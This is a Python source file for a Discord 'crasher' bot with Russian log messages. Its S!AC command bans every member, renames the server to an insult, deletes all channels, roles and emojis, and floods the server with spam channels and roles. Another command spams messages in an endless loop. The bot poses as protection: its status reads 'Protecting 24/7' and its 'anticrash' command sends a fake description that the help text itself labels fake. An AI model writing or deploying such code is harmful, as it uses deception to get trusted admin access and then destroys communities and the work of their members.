import discord, os, sys, random, string, requests, configparser, json, asyncio, time, funcs
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name
init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))


if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='S!', intents=intents)
client.remove_command("help")


@client.command()
async def AC(ctx):

    print(f"{Fore.WHITE}> {Fore.RED}Баним{Fore.WHITE}...")
    ban = 0
    bany = 0
    for member in ctx.guild.members:
        try:
            ban += 1
            await member.ban()
            bany += 1
            print(
                f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}"
            )
        except:
            print(
                f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}"
            )
            continue
    print(
        f"{Fore.WHITE}> {Fore.RED}Было {Fore.WHITE} {ban} {Fore.RED} человек, а забанил {Fore.WHITE} {bany} {Fore.RED} человек {Fore.WHITE}."
    )
    await ctx.send("@everyone F серверу! ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="Какашка", icon=icon)

    print(
        f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )"
    )

    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(
                f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}"
            )
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
        
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(
                f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик"
            )
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(100):
        await ctx.guild.create_text_channel("SUBSCRIBE TO ANONIMUS")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
    for a in range(100):
        try:
                await ctx.guild.create_role(name="SUBSCRIBE TO ANONIMUS", reason='fuck')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
    
    crashed = 0
    for guild in client.guilds:
      try:
          crashed += 1
          await guild.leave()
      except discord.HTTPException:()
      print("Очистка выполнена успешно!")
      print(f"Очистил {crashed} серверов!")

    for guild in client.guilds:
         try:
          await guild.leave()
         except discord.HTTPException:()

@client.command()
async def CROLE(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")

@client.command()
async def spamisoffforall1010(ctx):
    while True:
        await ctx.send("GG! ")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")

@client.command()
async def anticrash (ctx):
  await ctx.send("This bot works automatically, you do not need to enter anything because the bot is asleep, but if it finds out that the server has started to crash, it will immediately wake up and ban the bad crash bot.")

@client.command()
async def FHELP (ctx):
  await ctx.send("Все команды бота:\nS!AC     - Авто-краш сервера. (Как в видео)\nS!CROLE - Удалить все роли на сервере.\nS!FHELP   - Вызвать меню помощи.\nS!anticrash   - Фейковое описание бота.\nПоследнее обновление: 28.01.2022 💌\n ")

@client.command()
async def Guildleave (ctx):
        print("Начинаю очистку серверов через 5")
        await ctx.send("Начинаю очистку серверов через 5")
        time.sleep(1)
        print("Начинаю очистку серверов через 4")
        await ctx.send("Начинаю очистку серверов через 4")
        time.sleep(1)
        print("Начинаю очистку серверов через 3")
        await ctx.send("Начинаю очистку серверов через 3")
        time.sleep(1)
        print("Начинаю очистку серверов через 2")
        await ctx.send("Начинаю очистку серверов через 2")
        time.sleep(1)
        print("Начинаю очистку серверов через 1")
        await ctx.send("Начинаю очистку серверов через 1")
        time.sleep(1)
        print("Начинаю очистку серверов!")
        await ctx.send("Начинаю очистку серверов!")
        clean = 0
        for guild in client.guilds:
         try:
          clean += 1
          await guild.leave()
         except discord.HTTPException:()
        print("Очистка выполнена успешно!")
        print(f"Очистил {clean} серверов!")

@client.event
async def on_ready():
    print("Всё готово!")
    await client.change_presence(status=discord.Status.idle, activity=discord.Game('💧 Protecting 24/7 '))

try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
